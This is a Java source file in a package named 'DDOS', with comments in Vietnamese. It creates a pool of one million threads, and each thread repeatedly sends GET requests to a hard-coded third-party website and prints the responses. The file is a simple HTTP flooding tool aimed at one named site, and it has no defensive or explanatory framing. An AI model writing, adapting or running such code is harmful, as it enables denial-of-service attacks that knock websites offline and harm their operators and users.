package DDOS;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ConcurrentHttpRequestExample {
    public static void main(String[] args) {
        String url = "https://starjinxroblox.com/";  // Thay thế bằng URL của trang web bạn muốn gửi request tới
        int numThreads =1000000;  // Số lượng luồng

        // Tạo một ExecutorService với số lượng luồng cần tạo
        ExecutorService executorService = Executors.newFixedThreadPool(numThreads);

        // Tạo và thực thi các luồng
        for (int i = 0; i < numThreads; i++) {
            Runnable worker = new RequestWorker(url);
            executorService.execute(worker);
        }

        // Đóng ExecutorService sau khi hoàn thành
        executorService.shutdown();
    }
}

class RequestWorker implements Runnable {
    private final String url;

    public RequestWorker(String url) {
        this.url = url;
    }

    @Override
    public void run() {
        try {
            // Tạo đối tượng URL từ địa chỉ URL cần gửi request
            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();

            // Thiết lập phương thức request (GET, POST, PUT, DELETE, v.v.)
            con.setRequestMethod("GET");

            // Lấy phản hồi từ server
            int responseCode = con.getResponseCode();
            System.out.println("Thread " + Thread.currentThread().getId() + " - Phản hồi từ server: " + responseCode);

            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();

            // Đọc phản hồi từ server
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();

            // Hiển thị phản hồi từ server
            System.out.println("Thread " + Thread.currentThread().getId() + " - Nội dung phản hồi từ server:\n" + response.toString());
//            System.out.println("Thread " + Thread.currentThread().getId() + " - Nội dung phản hồi từ server:\n" );

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
